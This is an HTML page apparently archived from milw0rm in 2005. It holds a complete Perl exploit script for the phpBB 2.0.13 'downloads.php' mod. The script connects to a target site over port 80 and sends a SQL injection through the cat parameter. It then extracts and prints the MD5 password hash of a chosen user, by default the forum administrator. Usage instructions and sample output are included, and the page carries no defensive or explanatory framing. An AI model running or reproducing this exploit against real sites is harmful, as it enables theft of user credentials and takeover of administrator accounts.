<html><head><title>phpBB <= 2.0.13 'downloads.php' mod Remote Exploit</title></head><pre>#!/usr/bin/perl -w
use IO::Socket;

##    Example:
##    C:\&gt;phpbb.pl www.site.com /phpBB2/ 2
##
##     downloads.php mod in phpBB &lt;= 2.0.13
##     **********************************
##      [~] Connecting...
##      [+] Connected!
##      [~] Sending Data...
##      [~] Data Sent, Waiting for response...
##      [+] MD5 Hash for user with id=2 is: 81dc9bdb52d04dc20036dbd8313ed055
##
if (@ARGV &lt; 3)
{
print &quot;\n\n&quot;;
print &quot;|****************************************************************|\n&quot;;
print &quot; phpBB &lt;=2.0.13 'downloads.php' Mod\n&quot;;
print &quot; Bug found by Axl And CereBrums\n&quot;;
print &quot; Coded by CereBrums // 2/4/2005\n&quot;;
print &quot; Usage: phpbb.pl &lt;site&gt; &lt;folder&gt; &lt;user_id&gt;\n&quot;;
print &quot; e.g.: phpbb.pl www.site.com /phpBB2/ 2 \n&quot;;
print &quot; [~] &lt;server&gt; - site address\n&quot;;
print &quot; [~] &lt;folder&gt; - forum folder\n&quot;;
print &quot; [~] &lt;user_id&gt; - user id (2 default for phpBB admin)\n&quot;;
print &quot;|****************************************************************|\n&quot;;
print &quot;\n\n&quot;;
exit(1);
}

$take = 0;
$success = 0;
$server = $ARGV[0];
$folder = $ARGV[1];
$user_id = $ARGV[2];
print &quot;\n downloads.php mod in phpBB &lt;= 2.0.13\n&quot;;
print &quot; **********************************\n&quot;;
print &quot;  [~] Connecting...\n&quot;;
$socket = IO::Socket::INET-&gt;new(
Proto =&gt; &quot;tcp&quot;,
PeerAddr =&gt; &quot;$server&quot;,
PeerPort =&gt; &quot;80&quot;) || die &quot;$socket error $!&quot;;

print &quot;  [+] Connected\n&quot;;
print &quot;  [~] Sending Data...\n&quot;;

$path = &quot;http://$server/&quot;;
$path .= &quot;/$folder/&quot;;
$path .= &quot;downloads.php?cat=-1%20UNION%20SELECT%200,user_password,0,0,0,0,0,0,0%20FROM%20phpbb_users%20WHERE%20user_id=$user_id/*&quot;;
print $socket &quot;GET $path HTTP/1.0\r\n\r\n&quot;;

print &quot;  [~] Data Sent, Waiting for response...\n&quot;;

while ($answer = &lt;$socket&gt;)
{
       if ($take == 1) {
               $pass = substr($answer,51,32);
               print &quot;  [+] MD5 Hash for user with id=$user_id is: $pass\n&quot;;
               $success = 1;
               $take = 0;
       }
       $found = rindex ($answer,&quot;downloads.php?view=detail&amp;id=0&amp;cat=0&quot;);
       if ( $found &gt; -1 ) {
               $take = 1;
       }
}
if ($success==0) {print &quot;  [-] Exploit failed\n&quot;;}

## EOF ##

# milw0rm.com [2005-04-02]</pre></html>